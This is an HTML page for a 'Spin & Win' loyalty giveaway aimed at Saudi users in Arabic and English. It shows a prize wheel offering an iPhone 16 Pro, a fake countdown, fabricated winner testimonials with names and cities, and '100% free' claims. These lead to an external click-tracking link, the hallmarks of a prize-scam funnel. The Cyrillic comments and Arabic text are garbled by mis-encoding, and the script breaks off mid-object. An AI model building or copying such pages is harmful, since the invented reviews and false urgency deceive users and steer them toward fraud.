<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Spin & Win</title>
<meta name="robots" content="noindex,nofollow,noarchive">
<link rel="icon" href="img/favicon.ico">
<link rel="preload" as="image" href="img/apple-iphone-16-pro-natural-titanium.webp">
<style>
  /* ---------- Ğ‘ĞĞ—ĞĞ’Ğ«Ğ• ĞŸĞ•Ğ Ğ•ĞœĞ•ĞĞĞ«Ğ• ---------- */
  :root{
    --bg:#0b111a; --panel:#0f1825; --rim:#10243c;
    --blue:#4fc3f7; --yellow:#ffd54f; --ink:#071627;
    --text:#eaf3ff; --muted:#9fb2cc;
    --accent:#10c28a; --gold:#ffd54f;

    /* UI: Ñ‡Ğ¸Ğ¿Ñ‹, CTA, Ğ°Ğ²Ğ°Ñ‚Ğ°Ñ€ */
    --chipBg:#ffd84d; --chipBorder:#ffcc3d; --chipActive:#ffb500;
    --ctaStart:#ffe067; --ctaEnd:#fecb35; --ctaShadow:rgba(255,193,7,.35);
    --avatarA:#ffd54f; --avatarB:#f9b233;
  }

  /* ---------- Ğ¢Ğ•ĞœĞ« ---------- */
  /* Ğ´ĞµÑ„Ğ¾Ğ»Ñ‚ â€” Ğ·Ğ¾Ğ»Ğ¾Ñ‚Ğ¾/ÑĞ¸Ğ½Ğ¸Ğ¹  v1 */

  /* Ğ·ĞµĞ»Ñ‘Ğ½Ğ¾/Ñ„Ğ¸Ğ¾Ğ»ĞµÑ‚Ğ¾Ğ²Ğ°Ñ Ñ‚ĞµĞ¼Ğ° Ğ½Ğ° Ğ¿Ğ¾Ğ´Ğ¼ĞµĞ½Ñƒ v2*/

  /* Ğ·ĞµĞ»Ñ‘Ğ½Ğ¾/Ñ„Ğ¸Ğ¾Ğ»ĞµÑ‚Ğ¾Ğ²Ğ°Ñ Ñ‚ĞµĞ¼Ğ° v2*/
html[data-theme="gv"]{
  --yellow:#5bff47;     /* ÑÑ€ĞºĞ¸Ğ¹ Ğ·ĞµĞ»Ñ‘Ğ½Ñ‹Ğ¹ ÑĞµĞºÑ‚Ğ¾Ñ€ */
  --blue:#7d4dff;       /* Ğ½Ğ°ÑÑ‹Ñ‰ĞµĞ½Ğ½Ñ‹Ğ¹ Ñ„Ğ¸Ğ¾Ğ»ĞµÑ‚Ğ¾Ğ²Ñ‹Ğ¹ ÑĞµĞºÑ‚Ğ¾Ñ€ */
  --gold:#aaff66;       /* ÑÑ‚Ñ€ĞµĞ»ĞºĞ°, Ğ°Ğ²Ğ°Ñ‚Ğ°Ñ€Ñ‹ */

  --chipBg:#aaff66;
  --chipBorder:#5bff47;
  --chipActive:#7dff4d;

  --ctaStart:#aaff66;
  --ctaEnd:#5bff47;
  --ctaShadow:rgba(91,255,71,.35);

  --avatarA:#aaff66;
  --avatarB:#5bff47;
}


  /* ---------- Ğ“Ğ›ĞĞ‘ĞĞ› ---------- */
  *{box-sizing:border-box}
  html, body{ height:100%; overflow-x:hidden; }
  body{
    margin:0;
    font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
    background:radial-gradient(1200px 600px at 50% -20%,#18253a 0%,#0b111a 70%);
    color:var(--text);
    display:flex; justify-content:center;
  }
/* --- ÑÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ ĞºĞ¾Ğ½Ñ‚ĞµĞ¹Ğ½ĞµÑ€Ğ° Ğ¸ ĞºĞ¾Ğ»ĞµÑĞ° --- */
.wrap{
  width:100%;
  max-width:820px;
  margin:20px auto;
  padding-inline:12px;          /* Ğ½ĞµĞ±Ğ¾Ğ»ÑŒÑˆĞ¾Ğ¹ Ğ²Ğ½ÑƒÑ‚Ñ€ĞµĞ½Ğ½Ğ¸Ğ¹ Ğ¾Ñ‚ÑÑ‚ÑƒĞ¿ Ğ²Ğ¼ĞµÑÑ‚Ğ¾ Ğ´ĞµÑ€Ğ³Ğ°ÑÑ‰ĞµĞ³Ğ¾ÑÑ vw */
}

  /* ---------- Ğ¨ĞĞŸĞšĞ ---------- */
  .header{
    background:#15243a; border:1px solid #1f3657; height:56px;
    display:flex; align-items:center; justify-content:center; gap:10px;
    border-radius:10px; box-shadow:0 8px 26px rgba(0,0,0,.35);
    position:relative; padding:0 54px;
  }
.flag {
    position: absolute;
    left: 10px;
    width: 40px; /* Ğ±Ñ‹Ğ»Ğ¾ 32px */
    height: 28px; /* Ğ±Ñ‹Ğ»Ğ¾ 22px */
    object-fit: cover;
    border-radius: 4px; /* Ğ±Ñ‹Ğ»Ğ¾ 3px */
    box-shadow: 0 0 0 1px #254265, 0 2px 4px rgba(0,0,0,0.35); /* Ğ´Ğ¾Ğ±Ğ°Ğ²Ğ¸Ğ» Ğ»Ñ‘Ğ³ĞºÑƒÑ Ñ‚ĞµĞ½ÑŒ */
}
  /* ÑĞºÑ€Ñ‹Ğ²Ğ°ĞµĞ¼ ÑĞ²Ğ¸Ñ‚Ñ‡ĞµÑ€ Ğ² ÑˆĞ°Ğ¿ĞºĞµ, Ğ¾ÑÑ‚Ğ°Ğ²Ğ»ÑĞµĞ¼ Ğ² DOM */
  .header .lang{ display:none !important; }
  .lang button{
    border:1px solid #284569; background:#0f1b2c; color:#cfe3ff;
    border-radius:10px; padding:6px 10px; cursor:pointer;
  }
  .lang button.active{ background:#1a3253; }

  /* ---------- ĞŸĞĞĞ•Ğ›Ğ˜ ---------- */
  .panel{
    background:linear-gradient(180deg,#0f1d2c,#0b1624);
    border:1px solid #1c2e49; border-radius:16px; padding:16px;
    box-shadow:0 12px 28px rgba(3,11,23,.45);
  }
  .panel + .panel{ margin-top:14px; }

  /* ---------- ĞšĞĞ›Ğ•Ğ¡Ğ ---------- */
/* wheel */
.wheel-area{display:flex; flex-direction:column; align-items:center; gap:12px; margin-bottom:20px;}
.wheel-shell{
  width:100%;
  max-width:540px;
  aspect-ratio:1/1;
  border-radius:50%;
  position:relative;
  background:radial-gradient(circle at 50% 50%, #1a2b42 0 56%, #0d1a2a 75% 100%);
  box-shadow: inset 0 0 0 6px #22324b, inset 0 0 24px 12px #0c1624, 0 0 0 10px #09121d;
  overflow:hidden;          /* â† Ğ’ĞĞ–ĞĞ: Ğ¾Ğ±Ñ€ĞµĞ·Ğ°ĞµĞ¼ Ñ‚ĞµĞ½Ğ¸ Ğ¸ Ğ½Ğµ Ğ´Ğ°Ñ‘Ğ¼ Ğ¿Ğ¾ÑĞ²Ğ»ÑÑ‚ÑŒÑÑ Ğ³Ğ¾Ñ€Ğ¸Ğ·Ğ¾Ğ½Ñ‚Ğ°Ğ»ÑŒĞ½Ğ¾Ğ¼Ñƒ ÑĞºÑ€Ğ¾Ğ»Ğ»Ñƒ */
  contain:paint;            /* Ğ»Ğ¾ĞºĞ°Ğ»Ğ¸Ğ·ÑƒĞµĞ¼ Ğ¿ĞµÑ€ĞµÑ€Ğ¸ÑĞ¾Ğ²ĞºÑƒ */
  isolation:isolate;        /* Ğ¾Ñ‚Ğ´ĞµĞ»ÑŒĞ½Ñ‹Ğ¹ stacking context, ÑÑ‚Ğ°Ğ±Ğ¸Ğ»ÑŒĞ½ĞµĞµ ĞºĞ¾Ğ¼Ğ¿Ğ¾Ğ·Ğ¸Ñ‚Ğ¸Ğ½Ğ³ */
}
.wheel-shell::before{
  content:"";
  position:absolute; inset:14px; border-radius:50%;
  pointer-events:none;
  box-shadow:0 4px 10px rgba(0,0,0,.35);  /* â† Ñ‚ĞµĞ½ÑŒ Ñ‚ĞµĞ¿ĞµÑ€ÑŒ Ğ·Ğ´ĞµÑÑŒ */
}

  .pointer{
    position:absolute; left:50%; top:-2px; transform:translateX(-50%);
    width:0;height:0;border-left:13px solid transparent;border-right:13px solid transparent;
    border-bottom:20px solid var(--gold); filter:drop-shadow(0 2px 4px #000);
  }
/* Ñ€Ğ°ÑÑ‚Ñ€Ğ¾Ğ²Ğ¾Ğµ ĞºĞ¾Ğ»ĞµÑĞ¾ */
#wheelImg{
  position:absolute;
  inset:14px;
  width:calc(100% - 28px);
  height:calc(100% - 28px);
  object-fit:contain;
  transform-origin:50% 50%;
  will-change:transform;
  backface-visibility:hidden;
  transform:translateZ(0); /* Ğ¾Ñ‚Ğ´ĞµĞ»ÑŒĞ½Ñ‹Ğ¹ ĞºĞ¾Ğ¼Ğ¿Ğ¾Ğ·Ğ¸Ñ‚Ğ½Ñ‹Ğ¹ ÑĞ»Ğ¾Ğ¹ */
}

  .hint{ font-size:14px; color:var(--muted); text-align:center; }
  .timerWrap{ display:flex; align-items:center; justify-content:center; gap:10px; margin-top:4px; }
  .timerLabel{ color:#9fb2cc; }
  .timerBox{
    min-width:84px; text-align:center; font-weight:900; font-size:28px; padding:8px 14px; border-radius:10px;
    background:#0e1a2a; border:1px solid #20324d; box-shadow:inset 0 0 12px rgba(0,0,0,.25);
  }
  .timerBox b{ font-variant-numeric:tabular-nums; }

  /* ---------- ĞšĞĞœĞœĞ•ĞĞ¢Ğ« ---------- */
  .comments{ background:#0f1826; border:1px solid #1a2a45; border-radius:12px; padding:10px; }
  .cmt{
    display:flex; align-items:flex-start; gap:10px; padding:10px 0;
    border-bottom:1px solid #1b2b47;
  }
  .cmt:last-child{ border-bottom:0; }

  /* Ğ°Ğ²Ğ°Ñ‚Ğ°Ñ€: Ğ¿Ğ¾Ğ´Ñ…Ğ²Ğ°Ñ‚Ñ‹Ğ²Ğ°ĞµÑ‚ Ñ‚ĞµĞ¼Ñƒ */
  .cmt .avatar{
    width:40px; height:40px; flex:0 0 40px;
    border-radius:50%; display:grid; place-items:center;
    font-weight:900; color:#0c1526;
    background:linear-gradient(200deg,var(--avatarA),var(--avatarB));
  }
  .cmt > div{ flex:1; }
  .meta{ font-size:12px; color:#9fb2cc; }
  .btns{ display:flex; gap:6px; flex-wrap:wrap; font-size:13px; color:#8fb2ff; }

  /* Ğ½Ğ°Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¸Ğµ Ğ²Ñ€ÑƒÑ‡Ğ½ÑƒÑ ĞºĞ»Ğ°ÑÑĞ°Ğ¼Ğ¸ */
  .cmt.ltr{ direction:ltr; text-align:left; flex-direction:row; }
  .cmt.rtl{ direction:rtl; text-align:right; flex-direction:row-reverse; }
  .cmt.rtl .btns{ justify-content:flex-end; }

  /* ---------- ĞœĞĞ”ĞĞ›ĞšĞ˜ ---------- */
  .modal{
    position:fixed; inset:0; background:rgba(2,8,15,.75);
    display:none; align-items:center; justify-content:center; z-index:50;
  }
  .modal.show{ display:flex; }
  .card{
    width:min(560px,92%); background:linear-gradient(180deg,#0e1a2a,#0a1321);
    border:1px solid #20324d; border-radius:18px; padding:22px; text-align:center;
    box-shadow:0 18px 48px rgba(0,0,0,.5);
  }
  .celebrate{ font-size:30px; font-weight:900; color:#ffe072; text-shadow:0 2px 0 #6b5200; }
  .prize{ font-size:18px; margin:8px 0 14px; }

  /* CTA ĞºĞ½Ğ¾Ğ¿ĞºĞ° Ğ¿Ğ¾Ğ´ Ñ‚ĞµĞ¼Ñƒ */
/* ĞºĞ½Ğ¾Ğ¿ĞºĞ° â€” ÑĞ¾Ğ±ÑÑ‚Ğ²ĞµĞ½Ğ½Ñ‹Ğ¹ ÑĞ»Ğ¾Ğ¹ + ÑÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ Ğ¿ÑƒĞ»ÑŒÑĞ° */
.claim{
  display:inline-block; text-align:center; text-decoration:none; border:none; cursor:pointer;
  width:100%; padding:16px; border-radius:12px;
  background:linear-gradient(180deg,var(--ctaStart),var(--ctaEnd));
  color:#311e00; font-weight:900;
  box-shadow:0 10px 20px var(--ctaShadow);
  will-change:transform;          /* Ğ¾Ñ‚Ğ´ĞµĞ»ÑŒĞ½Ñ‹Ğ¹ ĞºĞ¾Ğ¼Ğ¿Ğ¾Ğ·Ğ¸Ñ‚Ğ½Ñ‹Ğ¹ ÑĞ»Ğ¾Ğ¹ */
  backface-visibility:hidden;
  transform:translateZ(0);
}
  html[lang="en"] .claim{ text-transform:uppercase; letter-spacing:.3px; font-size:17px; }
  html[lang="ar"] .claim{ font-size:19px; }
  .claim.pulse{ animation:btnPulse 1.6s ease-in-out infinite; }
  @keyframes btnPulse{
    0%,100%{ transform:scale(1); box-shadow:0 10px 20px var(--ctaShadow); }
    50%    { transform:scale(1.04); box-shadow:0 14px 26px var(--ctaShadow); }
  }

  .prizeImg{ max-width:260px; width:80%; margin:8px auto 2px; display:block; border-radius:10px; }

  .confetti{ position:absolute; inset:0; pointer-events:none; overflow:hidden; }
  .piece{ position:absolute; width:10px; height:14px; background:#ffd54f; top:-20px; animation:fall 1.8s linear infinite; opacity:.9; }
  .piece.b{ background:#4fc3f7; }
  .piece.c{ background:#7cf1c8; }
  @keyframes fall{ to{ transform:translateY(110vh) rotate(540deg); } }

  .sector-win{
    filter:drop-shadow(0 0 10px rgba(255,213,79,.9)) drop-shadow(0 0 18px rgba(255,213,79,.7));
    stroke:#ffe072 !important; stroke-width:4 !important;
  }

  #introModal .prizeImg{
    max-width:320px; width:86%; border-radius:14px; box-shadow:0 10px 30px rgba(0,0,0,.35);
  }

  /* ---------- Ğ§Ğ˜ĞŸĞ« Ğ¯Ğ—Ğ«ĞšĞ (Ğ² Ğ¸Ğ½Ñ‚Ñ€Ğ¾), Ñ†Ğ²ĞµÑ‚Ğ° â€” Ğ¾Ñ‚ Ñ‚ĞµĞ¼Ñ‹ ---------- */
  .introLang{ display:flex; gap:10px; justify-content:center; margin:6px 0 14px; }
  .lang-chip{
    font-size:15px; font-weight:800; padding:8px 14px; border-radius:999px; cursor:pointer;
    border:1px solid var(--chipBorder); background:var(--chipBg); color:#1b1200;
    box-shadow:0 2px 0 rgba(0,0,0,.25), 0 0 0 2px rgba(0,0,0,.08) inset;
    transition:filter .15s ease, transform .05s ease;
  }
  .lang-chip:hover{ filter:brightness(1.05); }
  .lang-chip:active{ transform:translateY(1px); }
  .lang-chip:focus-visible{ outline:2px solid #fff; outline-offset:2px; }
  .lang-chip.active{
    background:var(--chipActive); border-color:var(--chipBorder); color:#0b0b0b;
    box-shadow:0 2px 0 rgba(0,0,0,.28), 0 0 0 2px rgba(0,0,0,.10) inset;
  }

  /* Ğ´Ğ»Ñ Ğ´ĞµÑĞºÑ‚Ğ¾Ğ¿Ğ¾Ğ² â€” Ñ€ĞµĞ·ĞµÑ€Ğ² Ğ¿Ğ¾Ğ´ ÑĞºÑ€Ğ¾Ğ»Ğ»Ğ±Ğ°Ñ€, Ñ‡Ñ‚Ğ¾Ğ±Ñ‹ Ğ½Ğµ Ğ±Ñ‹Ğ»Ğ¾ ÑĞ´Ğ²Ğ¸Ğ³Ğ° (Ğ¼Ğ¾Ğ±Ğ¸Ğ»ĞºĞ¸ Ğ¸Ğ³Ğ½Ğ¾Ñ€ÑÑ‚, Ğ½Ğ¾ Ğ½Ğµ Ğ¼ĞµÑˆĞ°ĞµÑ‚) */
html{ scrollbar-gutter:stable both-edges; }
</style>


</head>
<body>

<div class="wrap">
  <div class="header">
    <img src="img/flag-sa-2.webp" alt="SA" class="flag">
    <b id="title">Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø§Ù„ÙˆÙ„Ø§Ø¡</b>
    <div class="lang">
      <button id="btnEN" aria-label="Switch to English">EN</button>
      <button id="btnAR" class="active" aria-label="Ø§Ù„ØªØ¨Ø¯ÙŠÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©">AR</button>
    </div>
  </div>

  <div id="first" class="panel">
    <div class="wheel-area">
      <div class="wheel-shell" id="wheelShell">
        <div class="pointer"></div>
        <img id="wheelImg" src="img/wheel_1024-2.webp" alt="" />
      </div>
    </div>
      <div class="hint"><span id="attemptsLabel">Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©:</span> <b id="tries">3</b></div>
      <div class="hint" id="finalHint">Ù„Ø¯ÙŠÙƒ Ø«Ù„Ø§Ø« Ù…Ø­Ø§ÙˆÙ„Ø§Øª! Ù„Ø§ ØªÙÙˆÙ‘Øª Ø§Ù„ÙØ±ØµØ©.</div>

      <div class="timerWrap">
        <span class="timerLabel" id="timerLabel">Offer ends in</span>
        <div class="timerBox"><b id="countdown">60</b>s</div>
      </div>
    </div>

    <div class="panel" style="padding:12px; margin-top:16px">
      <div class="comments" id="commentsSA">

        <!-- EN -->
        <div class="cmt ltr">
          <div class="avatar">R</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Ramir Lassiter</div>
            <div>Got the iPhone! Wanted an iMac, but not todayâ€¦</div>
            <div class="meta">Yesterday at 08:13</div>
            <div class="btns"><span>Like</span> Â· <span>Comment</span></div>
          </div>
        </div>

        <div class="cmt ltr">
          <div class="avatar">T</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Tony Hobbs</div>
            <div>I hit â€œno winâ€ twice, then iPhone. Wild ğŸ˜…</div>
            <div class="meta">2 days ago</div>
            <div class="btns"><span>Like</span> Â· <span>Comment</span></div>
          </div>
        </div>

        <div class="cmt ltr">
          <div class="avatar">M</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Marta Irvin</div>
            <div>Courier brought a brand new iPhone this morning!</div>
            <div class="meta">2 days ago</div>
            <div class="btns"><span>Like</span> Â· <span>Comment</span></div>
          </div>
        </div>

        <!-- AR -->
        <div class="cmt rtl">
          <div class="avatar">Ø¹</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Ø¹Ø¨Ø¯Ø§Ù„Ù„Ù‡ Ø§Ù„Ø´Ù…Ø±ÙŠ</div>
            <div>ØµØ±Ø§Ø­Ø© ØªÙˆÙ‚Ø¹Øª Ù…Ø²Ø­Ø©ØŒ Ù„ÙƒÙ† ÙÙŠ Ø§Ù„Ø¯ÙˆØ± Ø§Ù„Ø«Ø§Ù„Ø« Ø·Ù„Ø¹ Ø§Ù„Ø¢ÙŠÙÙˆÙ†! ğŸ‰</div>
            <div class="meta">Ù‚Ø¨Ù„ ÙŠÙˆÙ… Â· Ø§Ù„Ø±ÙŠØ§Ø¶</div>
            <div class="btns"><span>Ø¥Ø¹Ø¬Ø§Ø¨</span> Â· <span>ØªØ¹Ù„ÙŠÙ‚</span></div>
          </div>
        </div>

        <div class="cmt rtl">
          <div class="avatar">Ø³</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Ø³Ø§Ø±Ø© Ø§Ù„Ø¹ØªÙŠØ¨ÙŠ</div>
            <div>Ù…Ø­Ø§ÙˆÙ„ØªÙŠÙ† Ø¨Ø¯ÙˆÙ† ÙÙˆØ² ÙˆØ¨Ø¹Ø¯Ù‡Ø§ ÙØ²Øª Ø¨Ù‚Ø³ÙŠÙ…Ø© Ù‡Ø¯Ø§ÙŠØ§. ØªØ¬Ø±Ø¨Ø© Ø­Ù„ÙˆØ© ğŸ˜„</div>
            <div class="meta">Ù‚Ø¨Ù„ ÙŠÙˆÙ…ÙŠÙ† Â· Ø¬Ø¯Ø©</div>
            <div class="btns"><span>Ø¥Ø¹Ø¬Ø§Ø¨</span> Â· <span>ØªØ¹Ù„ÙŠÙ‚</span></div>
          </div>
        </div>

        <!-- EN -->
        <div class="cmt ltr">
          <div class="avatar">K</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Khaled M.</div>
            <div>Would be nicer with more colors, but the spin is fun and I won ğŸ‘</div>
            <div class="meta">3 days ago Â· Dammam</div>
            <div class="btns"><span>Like</span> Â· <span>Comment</span></div>
          </div>
        </div>

        <div class="cmt ltr">
          <div class="avatar">N</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Nora Alharbi</div>
            <div>Won a gift card on the third spin. Loved it!</div>
            <div class="meta">2 days ago Â· Riyadh</div>
            <div class="btns"><span>Like</span> Â· <span>Comment</span></div>
          </div>
        </div>

        <div class="cmt ltr">
          <div class="avatar">F</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Fahad S.</div>
            <div>Spins are quick and fun. Got the iPhone âœ…</div>
            <div class="meta">1 day ago Â· Jeddah</div>
            <div class="btns"><span>Like</span> Â· <span>Comment</span></div>
          </div>
        </div>

        <!-- AR -->
        <div class="cmt rtl">
          <div class="avatar">Ù…</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Ù…Ø­Ù…Ø¯ Ø§Ù„Ù‚Ø­Ø·Ø§Ù†ÙŠ</div>
            <div>Ø§Ù„Ø¹Ø¬Ù„Ø© Ù…Ù…ØªØ¹Ø© ÙˆÙØ²Øª Ø¨Ù‚Ø³ÙŠÙ…Ø©! ğŸ˜</div>
            <div class="meta">Ù‚Ø¨Ù„ 3 Ø£ÙŠØ§Ù… Â· Ø§Ù„Ø¯Ù…Ø§Ù…</div>
            <div class="btns"><span>Ø¥Ø¹Ø¬Ø§Ø¨</span> Â· <span>ØªØ¹Ù„ÙŠÙ‚</span></div>
          </div>
        </div>

        <div class="cmt rtl">
          <div class="avatar">Ø±</div>
          <div>
            <div style="font-weight:700;color:#9dc3ff">Ø±ÙŠÙ… Ø§Ù„Ø´Ù…Ø±ÙŠ</div>
            <div>ÙƒÙ†Øª Ù…ØªØ±Ø¯Ø¯Ø© Ø«Ù… ÙØ²Øª ÙÙŠ Ø§Ù„Ø¯ÙˆØ± Ø§Ù„Ø«Ø§Ù„Ø« ğŸ‰</div>
            <div class="meta">Ù‚Ø¨Ù„ ÙŠÙˆÙ… Â· Ø¬Ø¯Ø©</div>
            <div class="btns"><span>Ø¥Ø¹Ø¬Ø§Ø¨</span> Â· <span>ØªØ¹Ù„ÙŠÙ‚</span></div>
          </div>
        </div>

      </div>
    </div>

  </div>

</div>

<!-- INTRO MODAL -->
<div id="introModal" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="introTitle" aria-describedby="introText">
  <div class="card">
    <img class="prizeImg" id="introHero" src="img/winner1m.webp" alt="">
    <div class="introLang" id="introLang">
      <button class="lang-chip" id="introEN" aria-label="Switch to English">EN</button>
      <button class="lang-chip" id="introAR" aria-label="Ø§Ù„ØªØ¨Ø¯ÙŠÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©">AR</button>
    </div>
    <div class="celebrate" id="introTitle">ØªÙ… Ø§Ø®ØªÙŠØ§Ø±Ùƒ Ø§Ù„ÙŠÙˆÙ…!</div>
    <div class="prize" id="introText"></div>
    <div id="introBadges" style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin:8px 0 14px"></div>
    <button class="claim" id="introBtn" aria-label="Start now">Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¢Ù†</button>
  </div>
</div>

<!-- STAGE MODAL 1 -->
<div id="stageModal1" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="st1Title" aria-describedby="st1Text">
  <div class="card">
    <div class="celebrate" id="st1Title">Ø§Ù‚ØªØ±Ø¨Øª!</div>
    <div class="prize" id="st1Text">Ù„Ø¯ÙŠÙƒ Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø¶Ø§ÙÙŠØ©. Ø§Ø¶ØºØ· Â«Ù…ÙˆØ§ÙÙ‚Â» Ù„ØªØ¯ÙˆÙŠØ± Ø§Ù„Ø¹Ø¬Ù„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.</div>
    <button class="claim" id="st1Btn">Ù…ÙˆØ§ÙÙ‚</button>
  </div>
</div>

<!-- STAGE MODAL 2 -->
<div id="stageModal2" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="st2Title" aria-describedby="st2Text">
  <div class="card">
    <div class="celebrate" id="st2Title">Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø£Ø®ÙŠØ±Ø©!</div>
    <div class="prize" id="st2Text">Ø¯ÙˆØ±Ø© Ø£Ø®ÙŠØ±Ø© â€” Ø­Ø¸Ù‹Ø§ Ù…ÙˆÙÙ‚Ù‹Ø§!</div>
    <button class="claim" id="st2Btn">Ù…ÙˆØ§ÙÙ‚</button>
  </div>
</div>

<!-- WIN MODAL -->
<div id="winModal" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="winTitle" aria-describedby="winText">
  <div class="confetti" id="confetti"></div>
  <div class="card">
    <img class="prizeImg" src="img/apple-iphone-16-pro-natural-titanium.webp" alt="iPhone 16 Pro">
    <div class="celebrate" id="winTitle">ØªÙ‡Ø§Ù†ÙŠÙ†Ø§!</div>
    <div class="prize" id="winText">Ø£Ù†Øª Ø¹Ù„Ù‰ Ø¨ÙØ¹Ø¯ Ø®Ø·ÙˆØ© ÙˆØ§Ø­Ø¯Ø© Ù…Ù† Ø¬Ø§Ø¦Ø²ØªÙƒ! Ø§Ø¶ØºØ· Â«Ù…ØªØ§Ø¨Ø¹Ø©Â» Ù„Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø£Ø®ÙŠØ±Ø©.</div>
    <a href="https://mst.luvesso.com/click?lp=1" class="claim cta-button" id="claimBtn" rel="noreferrer" aria-label="Continue">Ù…ØªØ§Ø¨Ø¹Ø©</a>
  </div>
</div>

<script>
/* ========= LANG & TEXT ========= */
var urlLang = new URLSearchParams(location.search).get('lang');
var LANG = urlLang ? (urlLang.toLowerCase()==='ar' ? 'AR' : 'EN') : 'AR';

var i18n = {
  EN: {
    title:"LOYALTY PROGRAM",
    hint:"You have three attempts! Donâ€™t miss your chance.",
    timerLabel:"Offer ends in",
    sectors:[
      {t:"iPhone 16 Pro", color:"yellow"},
      {t:"Try again ğŸš«",  color:"blue"},
      {t:"Galaxy S24",   color:"yellow"},
      {t:"No win ğŸš«",    color:"blue"},
      {t:"Huawei Pura 70", color:"yellow"},
      {t:"Try again ğŸš«", color:"blue"},
      {t:"Gift Card",    color:"yellow"},
      {t:"No win ğŸš«",    color:"blue"}
    ],
    attempts:"Attempts left:",
    introTitle:"Limited-Time Invite!",
    introBadges: ["100% free", "No registration", "Winners daily"],
    ok:"Start now",
    st1Title:"Almost there!",
    st1Text:"You have another try. Tap â€œStart nowâ€ to spin again.",
    st2Title:"Last attempt!",
    st2Text:"One more spin â€” tap â€œStart nowâ€. Good luck!",
    winTitle:"Great!",
    winText:"Youâ€™re one step away from your prize! Tap â€œContinueâ€ to finish.",
    claim:"Continue"
  },
  AR: {
    title:"Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø§Ù„ÙˆÙ„Ø§Ø¡",
    hint:"Ù„Ø¯ÙŠÙƒ Ø«Ù„Ø§Ø« Ù…Ø­Ø§ÙˆÙ„Ø§Øª! Ù„Ø§ ØªÙÙˆÙ‘Øª Ø§Ù„ÙØ±ØµØ©.",
    timerLabel:"ÙŠÙ†ØªÙ‡ÙŠ Ø§Ù„Ø¹Ø±Ø¶ Ø®Ù„Ø§Ù„",
    sectors:[
      {t:"â€iPhone 16 Pro", color:"yellow"},
      {t:"Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ ğŸš«", color:"blue"},
      {t:"Galaxy S24",   color:"yellow"},
      {t:"Ø¨Ø¯ÙˆÙ† ÙÙˆØ² ğŸš«",  color:"blue"},
      {t:"Huawei Pura 70", color:"yellow"},
      {t:"Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ ğŸš«", color:"blue"},
      {t:"Ø¨Ø·Ø§Ù‚Ø© Ù‡Ø¯Ø§ÙŠØ§", color:"yellow"},
      {t:"Ø¨Ø¯ÙˆÙ† ÙÙˆØ² ğŸš«",  color:"blue"}
    ],
    attempts:"Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©:",
    introTitle:"Ø¯Ø¹ÙˆØ© Ù„ÙØªØ±Ø© Ù…Ø­Ø¯ÙˆØ¯Ø©!",
    introBadges: ["Ù…Ø¬Ø§Ù†ÙŠ 100%", "Ø¨Ø¯ÙˆÙ† ØªØ³Ø¬ÙŠÙ„", "ÙØ§Ø¦Ø²ÙˆÙ† ÙŠÙˆÙ…ÙŠÙ‹Ø§"],
    ok:"Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¢Ù†",
    st1Title:"Ø§Ù‚ØªØ±Ø¨Øª!",
    st1Text:"Ù„Ø¯ÙŠÙƒ Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø¶Ø§ÙÙŠØ©. Ø§Ø¶ØºØ· Â«Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¢Ù†Â» Ù„ØªØ¯ÙˆÙŠØ± Ø§Ù„Ø¹Ø¬Ù„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.",
    st2Title:"Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø£Ø®ÙŠØ±Ø©!",
    st2Text:"Ø¯ÙˆØ±Ø© Ø£Ø®ÙŠØ±Ø© â€” Ø§Ø¶ØºØ· Â«Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¢Ù†Â». Ø­Ø¸Ù‹Ø§ Ù…ÙˆÙÙ‚Ù‹Ø§!",
    winTitle:"ØªÙ‡Ø§Ù†ÙŠÙ†Ø§!",
